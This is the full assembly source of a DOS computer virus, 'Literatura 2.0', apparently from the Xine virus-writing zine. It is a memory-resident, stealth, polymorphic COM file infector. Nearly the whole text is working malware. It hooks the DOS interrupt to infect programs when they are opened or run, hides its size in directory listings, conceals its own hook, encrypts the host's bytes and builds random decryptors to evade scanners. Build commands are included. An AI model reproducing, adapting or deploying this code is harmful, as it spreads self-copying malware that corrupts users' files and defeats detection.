   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #3 - Phile 208 |
   ;                                         \-----------------------------/
   ;
   ;
   ;
   ; Comment %
   ;        Ü
   ;        Û      Û   V I R U S   Û
   ;        Û    ßÜÛÜ ÜÜ  Ü Ü ÜÜ  ÜÛÜ     Ü Ü ÜÜ
   ;        Û    Û Û ÛÜÜß Ûß Û  Û  Û Û  Û Ûß Û  Û    ÜßßÜ   ÜßßÜ
   ;        Û    Û Û Û    Û  Û  Û  Û Û  Û Û  Û  Û     Üß    Û  Û
   ;         ßßß ß ß  ßßß ß   ßßßß ß  ßß  ß   ßßßß    ßßß ß  ßß
   ;       TSR size stealth polymorphic COM midfile fast infector
   ;         Programmed by Int13h/iKx in Paraguay, South America
   ;
   ; Original  bytes of the hoste are stored in an encrypted form at EOF.
   ; Virus  code is in a random file position, a polymorphic header gives
   ; control  to  the  decryptor  generated  by  the  polymorphic engine.
   ; Greets  to  Dark  Avenger, who was the piooner in midfile infection,
   ; with  his great Commander Bomber. Also greetz to all my IRC-friends.
   ;
   ;                         tasm litera2 /m3
   ;                         tlink litera2 /t
   ; %

   .Model Tiny
   .Code
   Org 100h
   Jumps

   Heap       equ  (offset Final-offset OpaLaVya)
   Largor     equ  (offset OpaLaVya-offset Literatura)
   Parrafos1  equ  ((Largor+Heap+15)/16)+1
   Parrafos2  equ  ((Largor+Heap+15)/16)
   LDecryptor equ  (offset encriptora_1-offset instruccion_2)

   LITERATURA:
           Basura db 33d dup(090h)         ; Space where we will generate
   Modificar:                              ; the polymorphic decryptor
           int     3
       call    Delta
   Delta:  pop     bp
       sub     bp,offset Delta

       mov     ax,'i1'
       int     21h
       cmp     ax,'3!'
       je      LiteraturaIsAlreadySuckingMemory

       mov     ah,30h
       int     21h

       cmp     al,7
       jae     LiteraturaIsAlreadySuckingMemory

           mov     ax,3521h
       int     21h
       mov     word ptr [bp+Vieja21h],bx
       mov     word ptr [bp+Vieja21h+2],es

       mov     ax,ds
       dec     ax
       mov     es,ax
       mov     ax,es:[3]
       sub     ax,Parrafos1
       xchg    bx,ax

       push    ds
       pop     es

       mov     ah,4ah
       int     21h

       mov     ah,48h
       mov     bx,Parrafos2
       int     21h

       dec     ax
       mov     es,ax
       mov     word ptr es:[1],8
       inc     ax
       mov     es,ax
       xor     di,di

       push    cs
       pop     ds

       lea     si,[bp+offset Literatura]
       mov     cx,Largor
       rep     movsb

       push    es
       pop     ds
       mov     ax,2521h
       mov     dx,(offset Literatura21h-100h)
       int     21h


   LiteraturaIsAlreadySuckingMemory:
       push    cs cs
       pop     ds es

       cld
       lea     si,[bp+offset Primitivos]
       mov     di,100h
           push    di
       mov     cx,15
       rep     movsw

           lea     si,[bp+offset Copier]
           mov     di,06ch
           mov     ax,di
       mov     cx,5
           repe    movsw
           movsb

           db      0bfh
   Reales  dw      0
           add     di,100h
           mov     cx,Largor
   Descifrar_Bytes_Originales:
       dw      3580h
       Llave   db 0
       inc     di
       loop    Descifrar_Bytes_Originales

           mov     cx,Largor
           db      0beh
       Origen  dw 0
           add     si,100h
           db      0bfh
       Destino dw 0
           add     di,100h
       xor     bx,bx
           xor     dx,dx
       sub     bp,bp
           jmp     ax


   Copier: repe    movsb
           xor     si,si
           sub     di,di
           xor     ax,ax
           sub     cx,cx
           ret


   db " [LiTeRaTuRa 2.0 by Int13h] - MadE in ParaguaY "


   Metodo1:db      0e9h
   Despla1 dw      666

   Metodo2:db      0bbh
   Despla2 dw      666
       push    bx
       ret

   Metodo3:db      0e8h
   Despla3 dw      666

   Metodo4:db      0bbh
   Despla4 dw      666
       jmp     bx

   Metodo5:db      0bbh
   Despla5 dw      666
       call    bx

   Metodo6:push    cs
           db      0bbh
   Despla6 dw      666
       push    bx
       retf


   STEALTH1:
       xor     ah,0bah
       pushf
       call    dword ptr cs:[Vieja21h-100h]
       test    al,al
           jnz     Erebo

       push    ax bx es

           mov     ah,51h
       int     21h

       mov     es,bx
       cmp     bx,es:[16h]
       jne     Fuera

       mov     bx,dx
       mov     al,[bx]
       push    ax

       mov     ah,2fh
       int     21h
       pop     ax
           inc     al
       jnz     FCBComun
           add     bx,7
   FCBComun:
       mov     al,byte ptr es:[bx+17h]
       and     al,00011111b
           cmp     al,00011110b
       jne     Fuera

           cmp     word ptr es:[bx+1dh],Largor
       ja      Sustraer

       cmp     word ptr es:[bx+1fh],0
       je      Fuera
   Sustraer:sub    word ptr es:[bx+1dh],Largor
   Fuera:  pop     es bx ax
   Erebo:  retf    2



   LITERATURA21h:
       cmp     ax,'i1'                     ; Residence Checking
       je      Chequeo
           xor     ah,0bah
           cmp     ah,(03dh xor 0bah)          ; File Opening?
           je      InfectFile
       cmp     ah,(04bh xor 0bah)          ; Program loading?
           je      InfectFile
           cmp     ah,(11h xor 0bah)           ; FCB find first
           je      Stealth1
           cmp     ah,(12h xor 0bah)           ; FCB find next
           je      Stealth1
           cmp     ah,(4eh xor 0bah)           ; DTA find first
           je      Stealth2
           cmp     ah,(4fh xor 0bah)           ; DTA find next
           je      Stealth2
           cmp     ax,0d600h                   ; Extended Open
           je      InfectFile
           cmp     ah,(056h xor 0bah)          ; Rename
           je      InfectFile
           cmp     ah,(041h xor 0bah)          ; Delete
           je      InfectFile
           cmp     ah,(043h xor 0bah)          ; Get/Set attributes
           je      InfectFile
           cmp     ax,08f21h                   ; Camuflar 3521h
           je      Ocultar21h_A
           cmp     ax,09f21h                   ; Camuflar 2521h
           je      Ocultar21h_B
       xor     ah,0bah
   Interrupcion_21h:
       db      0eah
     Vieja21h      dd 0
   Chequeo:mov     ax,'3!'
       iret



   OCULTAR21h_A:
       xor     ah,0bah
       mov     bx,word ptr cs:[(Vieja21h-100h)]
       mov     es,word ptr cs:[(Vieja21h-100h)+2]
       iret


   OCULTAR21h_B:
       xor     ah,0bah
       mov     word ptr cs:[(Vieja21h-100h)],dx
       mov     word ptr cs:[(Vieja21h-100h)+2],ds
       iret



   STEALTH2:
       xor     ah,0bah
       pushf
       call    dword ptr cs:[Vieja21h-100h]
       jc      Infierno

       pushf
       push    ax di es bx

           mov     ah,2fh
       int     21h

       mov     ax,es:[bx+16h]
       and     al,00011111b
           cmp     al,00011110b
       jne     Paso

           cmp     word ptr es:[bx+1ah],Largor
       jb      Paso
           sub     word ptr es:[bx+1ah],Largor

   Paso:   pop     bx es di ax
       popf
   Infierno:
       retf    2


   Primitivos      db 30d dup(0c3h)


   SoloPopear:
       jmp     PopIt



   INFECTFILE:
       xor     ah,0bah
       push    ax bx cx dx si di ds es

           cmp     ax,6c00h
       jne     Apertura_Standard

           cmp     dx,0001
       jne     SoloPopear

           mov     dx,si

   Apertura_Standard:
       push    dx ds
       mov     ax,3524h
       int     21h
       mov     word ptr cs:[Real24h-100h],bx
       mov     word ptr cs:[(Real24h-100h)+2],es

       push    cs
       pop     ds

       mov     ax,2524h
       mov     dx,offset Handler24h-100h
       int     21h

       pop     ds dx

       push    ds
       pop     es
       cld
       mov     di,dx
       mov     cx,128
       mov     al,'.'
       repne   scasb
       jne     Popeo

       mov     ax,word ptr es:[di-3]
       or      ax,02020h
       cmp     ax,'dn'
       je      Popeo

       xchg    si,di
       lodsw
       or      ax,2020h
       cmp     ax,'oc'
       jne     Popeo
       lodsb
       or      al,20h
       cmp     al,'m'
       jne     Popeo

       mov     ax,3d02h
       pushf
           call    dword ptr cs:[Vieja21h-100h]
       jc      Popeo
       xchg    bx,ax

       mov     ax,5700h
       int     21h
       mov     word ptr cs:[(Hora-100h)],cx
       mov     word ptr cs:[(Fecha-100h)],dx
       and     cl,00011111b
           cmp     cl,00011110b
       je      Closeo

       push    cs cs
       pop     ds es

       mov     ah,03fh
       mov     dx,(offset Primitivos-100h)
       mov     cx,30
       int     21h

       mov     si,dx
       mov     ax,[si]
       add     ah,al
       cmp     ah,167d
       je      Closeo

       call    PunteroFin

       and     dx,dx
       jnz     Closeo

       cmp     ax,60000d
       ja      Closeo

           cmp     ax,3000d
       jbe     Closeo

           mov     cx,ax
           sub     cx,(Largor+40)

           call    Obtener_Numero_Aleatorio
           cmp     ax,40
       ja      Okis
           mov     ax,666

   Okis:   sub     ax,3
       mov     word ptr [Despla1-100h],ax
       mov     word ptr [Despla2-100h],ax
       mov     word ptr [Despla3-100h],ax
       mov     word ptr [Despla4-100h],ax
       mov     word ptr [Despla5-100h],ax
       mov     word ptr [Despla6-100h],ax
       add     ax,3

       mov     dx,ax
       push    dx
       mov     word ptr [Destino-100h],dx
       xor     cx,cx
       mov     ax,4200h
       int     21h

       mov     ah,3fh
           mov     dx,offset Vafer-100h
           mov     cx,Largor
       int     21h

       call    PunteroFin

       mov     word ptr [Reales-100h],ax
       mov     word ptr [Origen-100h],ax

       in      al,40h
       or      al,al
       jnz     NoCero
       inc     al
   NoCero: mov     byte ptr [Llave-100h],al

           mov     si,offset Vafer-100h
           mov     cx,Largor
   Cifrar_Bytes_Originales:
       xor     byte ptr [si],al
       inc     si
       loop    Cifrar_Bytes_Originales

       mov     ah,40h
           mov     cx,Largor
           mov     dx,offset Vafer-100h
       int     21h

       call    PunteroInicio
       mov     di,(offset Polymorphic_Header-100h)
       mov     cx,30
   Generate_Garbage:
       push    cx
       push    di
           mov     cx,40
           call    Obtener_Numero_Aleatorio
           mov     si,(offset Opcodes_de_un_byte-100h)
       add     si,ax
       pop     di
       movsb
       pop     cx
       loop    Generate_Garbage

           mov     cx,7
           call    Obtener_Numero_Aleatorio

       call    Generate_Polymorphic_Header

           mov     ah,40h
       mov     cx,30
       mov     dx,(offset Polymorphic_Header-100h)
       int     21h

           pop     dx
           push    dx
       xor     cx,cx
       mov     ax,4200h
       int     21h

           mov     si,offset Modificar-100h
           mov     di,offset Vafer-100h
           mov     cx,Largor-33d
           pop     bp
           add     bp,100h
           push    bx
           call    Ygramul
           pop     bx

       mov     ah,40h
           mov     dx,offset Vafer-100h
       int     21h

           db      0b9h
       Hora    dw 0
       and     cl,11100000b
           or      cl,00011110b
           db      0bah
       Fecha   dw 0
       mov     ax,5701h
       int     21h

   Closeo: mov     ah,3eh
       int     21h

   Popeo:  push    cs
       pop     ds

       lds     dword ptr dx,[Real24h-100h]
       mov     ax,2524h
       int     21h

   PopIt:  pop     es ds di si dx cx bx ax
       jmp     Interrupcion_21h


   PunteroInicio:
       mov     ax,04200h
       jmp     short Mover
   PunteroFin:
       mov     ax,04202h
   Mover:  xor     cx,cx
       cwd
       int     21h
       ret


   Handler24h:
       mov     al,03
       iret


   Generate_Polymorphic_Header:
           mov     byte ptr [Modificar-100h],0cch
       cmp     ax,2
           je      UsarMetodo2
       cmp     ax,3
           je      UsarMetodo3
       cmp     ax,4
           je      UsarMetodo4
       cmp     ax,5
           je      UsarMetodo5
       cmp     ax,6
           je      UsarMetodo6
       call    Arreglo_General
       mov     si,offset Metodo1-100h
           movsw
       movsb
       ret

   UsarMetodo2:
       call    Arreglo_General
       mov     si,offset Metodo2-100h
           movsw
           movsw
       movsb
       ret

   UsarMetodo3:
           call    Arreglo_General
           mov     byte ptr [Modificar-100h],05dh
       mov     si,offset Metodo3-100h
       movsw
       movsb
       ret

   UsarMetodo4:
       call    Arreglo_General
       mov     si,offset Metodo4-100h
           movsw
           movsw
       movsb
       ret

   UsarMetodo5:
       call    Arreglo_General
           mov     byte ptr [Modificar-100h],058h
       mov     si,offset Metodo5-100h
           movsw
           movsw
       movsb
       ret

   UsarMetodo6:
       call    Arreglo_General
       mov     si,offset Metodo6-100h
       movsw
           movsw
       movsw
       ret


   Arreglo_General:
           mov     cx,23
           call    Obtener_Numero_Aleatorio
       sub     word ptr [Despla1-100h],ax
       add     word ptr [Despla2-100h],103h
       sub     word ptr [Despla3-100h],ax
       add     word ptr [Despla4-100h],103h
       add     word ptr [Despla5-100h],103h
       add     word ptr [Despla6-100h],103h
       mov     di,offset Polymorphic_Header-100h
       add     di,ax
       ret

   ; Cheesy engine used to generate random fixed-size decryptors
   ; Uses xor/sub/add/not/neg/ror/rol/inc/dec for enc/decryption
   Ygramul:
           mov     word ptr [LiteCX1-100h],cx
           mov     word ptr [LiteCX2-100h],cx
           mov     word ptr [LiteBP-100h],bp
           mov     word ptr [LiteES-100h],es
           mov     word ptr [LiteSI-100h],si
           mov     word ptr [LiteDI-100h],di

           mov     si,offset ClaveEnc_1-100h
           mov     di,offset ClaveDec_1-100h

           in      ax,40h
           test    al,al
           jnz     Pasamos_al
           inc     al
   Pasamos_al:
           and     ah,ah
           jnz     Pasamos_ah
           dec     ah
   Pasamos_ah:
           mov     byte ptr [si+3],ah
           mov     byte ptr [di+3],ah
           mov     byte ptr [si],al
           mov     byte ptr [di],al
           in      al,40h
           or      al,al
           jnz     Listo
           inc     al
   Listo:  mov     byte ptr [si+6],al
           mov     byte ptr [di+6],al

           push    cs
           pop     es
           mov     di,offset Encriptora_4-100h+2
           mov     bx,offset Opcodes_de_un_byte-100h
           mov     si,6

   Rellenar:
           mov     cx,17
           call    Obtener_Numero_Aleatorio
           xlat
           stosb
           inc     di
           inc     di
           dec     si
           jnz     Rellenar

           mov     cx,127
           call    obtener_numero_aleatorio
           sub     word ptr [LiteBP-100h],ax
           mov     byte ptr [Desplazamiento1-100h],al
           mov     byte ptr [Desplazamiento2-100h],al

           mov     cx,4
           call    Obtener_Numero_Aleatorio
           mov     byte ptr [Indice-100h],al
           mov     si,offset Instruccion_2-100h
           mov     di,offset Instruccion_3-100h+2
           mov     bp,offset Instruccion_4-100h

           cmp     al,1
           jnz     No_fue_Uno
           mov     byte ptr [si],0beh
           mov     byte ptr [di],07ch
           mov     byte ptr ds:[bp+2],07ch
           mov     byte ptr ds:[bp+4],046h
           jmp     short Seleccionar_Contador
   No_fue_Uno:
           cmp     al,2
           jnz     No_fue_Dos
           mov     byte ptr [si],0bfh
           mov     byte ptr [di],07dh
           mov     byte ptr ds:[bp+2],07dh
           mov     byte ptr ds:[bp+4],047h
           jmp     short Seleccionar_Contador
   No_fue_Dos:
           cmp     al,3
           jnz     Fue_Cuatro
           mov     byte ptr [si],0bdh
           mov     byte ptr [di],07eh
           mov     byte ptr ds:[bp+2],07eh
           mov     byte ptr ds:[bp+4],045h
           jmp     short Seleccionar_Contador
   Fue_Cuatro:
           mov     byte ptr [si],0bbh
           mov     byte ptr [di],07fh
           mov     byte ptr ds:[bp+2],07fh
           mov     byte ptr ds:[bp+4],043h

   Seleccionar_Contador:
           mov     cx,6
           call    Obtener_Numero_Aleatorio
           mov     ah,byte ptr [Indice-100h]
           cmp     ah,al
           je      Seleccionar_Contador
           mov     byte ptr [Contador-100h],al

           mov     si,offset Instruccion_1-100h
           mov     di,offset Instruccion_6-100h
           cmp     al,1
           jnz     Uno_no_fue
           mov     byte ptr [si],0beh
           mov     byte ptr [di],04eh
           jmp     short Mutar_registros_de_trabajo
   Uno_no_fue:
           cmp     al,2
           jne     Dos_no_fue
           mov     byte ptr [si],0bfh
           mov     byte ptr [di],04fh
           jmp     short Mutar_registros_de_trabajo
   Dos_no_fue:
           cmp     al,3
           jne     Tres_no_fue
           mov     byte ptr [si],0bdh
           mov     byte ptr [di],04dh
           jmp     short Mutar_registros_de_trabajo
   Tres_no_fue:
           cmp     al,4
   jne Cuatro_no_fue
           mov     byte ptr [si],0bbh
           mov     byte ptr [di],04bh
           jmp     short Mutar_registros_de_trabajo
   Cuatro_no_fue:
           cmp     al,5
           jne     Seis_fue
           mov     byte ptr [si],0b9h
           mov     byte ptr [di],049h
           jmp     short Mutar_registros_de_trabajo
   Seis_fue:
           mov     byte ptr [si],0bah
           mov     byte ptr [di],04ah

   Mutar_registros_de_Trabajo:
           mov     cx,6
           call    Obtener_Numero_Aleatorio
           mov     byte ptr [Carga-100h],al
           mov     cl,byte ptr [Indice-100h]
           mov     ch,byte ptr [Contador-100h]
           cmp     al,2
           ja      No_CX
           cmp     ch,5
           je      Mutar_registros_de_Trabajo
           jmp     short Almacenar
   No_CX:  cmp     al,4
           ja      No_DX
           cmp     ch,6
           je      Mutar_registros_de_Trabajo
           jmp     short Almacenar
   No_DX:  cmp     cl,4
           je      Mutar_registros_de_Trabajo
           cmp     ch,4
           je      Mutar_registros_de_Trabajo


   Almacenar:
           and     byte ptr [Instruccion_3-100h+2],047h
           and     byte ptr [Instruccion_4-100h+2],047h

           cmp     al,1
           jnz     Uno_no_ha_sido
           mov     al,00101000b
           jmp     short ORearlo
   Uno_no_ha_sido:
           cmp     al,2
           jne     Dos_no_ha_sido
           mov     al,00001000b
           jmp     short ORearlo
   Dos_no_ha_sido:
           cmp     al,3
           jne     Tres_no_ha_sido
           mov     al,00110000b
           jmp     short ORearlo
   Tres_no_ha_sido:
           cmp     al,4
           jne     Cuatro_no_ha_sido
           mov     al,00010000b
           jmp     short ORearlo
   Cuatro_no_ha_sido:
           cmp     al,5
           jne     Fue_Six
           mov     al,00111000b
           jmp     short ORearlo
   Fue_Six:mov     al,00011000b

   ORearlo:mov     byte ptr [Orear-100h],al
           or      byte ptr [Instruccion_3-100h+2],al
           or      byte ptr [Instruccion_4-100h+2],al

           mov     di,offset Encriptar-100h
           mov     ax,15
           call    Llenar_con_basura

           mov     di,offset Buffer-100h
           mov     ax,15
           call    Llenar_con_basura

           mov     cx,5
           call    Obtener_Numero_Aleatorio
           mov     byte ptr [Cantidad-100h],al
           mov     bp,ax

           mov     di,offset Encriptar-100h

           xor     dx,dx
   Seleccionar_Instrucciones:
           mov     si,offset Encriptora_1-100h-3
           mov     cx,9
           call    Obtener_Numero_Aleatorio
           mov     cl,3
           mul     cl
           add     si,ax
           movsw
           movsb
           push    si
           push    di
           add     si,24
           mov     di,offset Buffer-100h
           add     di,dx
           add     dx,3
           movsw
           movsb
           pop     di
           pop     si
           dec     bp
           jnz     Seleccionar_Instrucciones

           mov     bp,3
           mov     si,offset Encriptar-100h

           mov     cx,5
   Inversor:
           mov     di,offset Instruccion_4-100h
           sub     di,bp
           add     bp,3
           movsw
           movsb
           loop    Inversor

           mov     si,offset Buffer-100h
           mov     di,offset Encriptar-100h
           mov     cx,15
           rep     movsb

           mov     si,offset Instruccion_4-100h-2
           mov     al,byte ptr [Orear-100h]
           mov     cl,3
           shr     al,cl
           xor     cx,cx
           mov     cl,byte ptr [Cantidad-100h]
   Proceder:
           and     byte ptr [si],11111000b
           or      byte ptr [si],al
           sub     si,3
           loop    Proceder


           db      0bfh
           LiteDI dw 0
           db      0b8h
           LiteES dw 0
           mov     es,ax
           db 0bah
           LiteCX1 dw 0
           mov     cx,LDecryptor
           add     word ptr [LiteBP-100h],cx
           push    cx
           mov     si,offset Instruccion_2-100h
           rep     movsb
           pop     cx
           add     cx,dx
           db      0beh
           LiteSI dw 0

   Realizar_la_encripcion:
           mov     bh,byte ptr ds:[si]
           Encriptar db 15 dup(0fbh)
           mov     byte ptr es:[di],bh
           inc     si
           inc     di
           dec     dx
           jnz     Realizar_la_encripcion
           ret


   Instruccion_2:   db 0beh
                    LiteBP dw 0
   Instruccion_1:   db 0bah
                    LiteCX2 dw 0
   Instruccion_3:   db 02eh,08ah,07ch
                    Desplazamiento1 db 0
                    Desencriptar db 15 dup(0f8h)
   Instruccion_4:   db 02eh,088h,07ch
                    Desplazamiento2 db 0
   Instruccion_5:   inc si
   Instruccion_6:   dec dx
                    jnz Instruccion_3


   Encriptora_1:    db 080h,0c7h
                    ClaveEnc_1 db 0
   Encriptora_2:    db 080h,0efh
                    ClaveEnc_2 db 0
   Encriptora_3:    db 080h,0f7h
                    ClaveEnc_3 db 0
   Encriptora_4:    inc bh
                    int 3
   Encriptora_5:    dec bh
                    sti
   Encriptora_6:    not bh
                    stc
   Encriptora_7:    neg bh
                    cld
   Encriptora_8:    ror bh,1
                    cmc
   Encriptora_9:    rol bh,1
                    nop

   Desencriptora_1: db 080h,0efh
                    ClaveDec_1 db 0
   Desencriptora_2: db 080h,0c7h
                    ClaveDec_2 db 0
   Desencriptora_3: db 080h,0f7h
                    ClaveDec_3 db 0
   Desencriptora_4: dec bh
                    nop
   Desencriptora_5: inc bh
                    stc
   Desencriptora_6: not bh
                    clc
   Desencriptora_7: neg bh
                    sti
   Desencriptora_8: rol bh,1
                    cmc
   Desencriptora_9: ror bh,1
   Opcodes_de_un_byte:
                    cld
           db 090h,0cch,0fch,0fbh,0f8h,0f9h,0f5h,037h,02fh,027h
           db 03fh,0ceh,098h,09fh,09bh,040h,048h,043h,04bh,041h
           db 049h,042h,04ah,046h,04eh,047h,04fh,045h,04dh,093h
           db 099h,091h,092h,095h,096h,097h,0ech,0edh,0d7h


   Obtener_Numero_Aleatorio:
           push    dx
           push    di
           in      ax,40h
           mov     dx,106
           mul     dx
           add     ax,1283
           mov     di,6075
           adc     dx,0
           div     di
           mov     ax,dx
           mul     cx
           div     di
           pop     di
           pop     dx
           inc     ax
           ret


   Llenar_con_basura:
           mov     bp,ax
   Repetir:mov     si,offset Opcodes_de_un_byte-100h
           mov     cx,17
           call    Obtener_Numero_Aleatorio
           add     si,ax
           movsb
           dec     bp
           jnz     Repetir
           ret


   Cantidad db 0
   Orear    db 0
   Buffer:
   Indice   db 0
   Contador db 0
   Carga    db 0
            db 13 dup(90h)

   OpaLaVya:
   Real24h dd 0
   Polymorphic_Header db 30 dup(0)
   Vafer db Largor dup(0)
   Final label byte

   End LITERATURA
